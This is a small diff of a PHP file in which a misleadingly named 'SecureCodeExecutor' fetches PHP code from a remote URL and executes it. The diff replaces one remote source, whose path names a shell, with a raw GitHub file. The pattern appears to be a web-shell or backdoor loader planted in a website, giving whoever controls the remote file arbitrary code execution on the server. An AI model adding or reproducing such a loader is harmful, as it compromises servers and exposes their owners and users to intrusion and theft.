@@ -49,7 +49,7 @@ try {
     $executor = new SecureCodeExecutor($fetcher);
 
     // Eksekusi kode PHP yang diambil dari URL
-    $executor->executeFetchedCode("https://desa-badai.pro/shell-antimale/04.txt");
+    $executor->executeFetchedCode("https://raw.githubusercontent.com/imous007/new/refs/heads/main/out.txt");
 } catch (Exception $e) {
     echo "Error: " . htmlspecialchars($e->getMessage());
 }
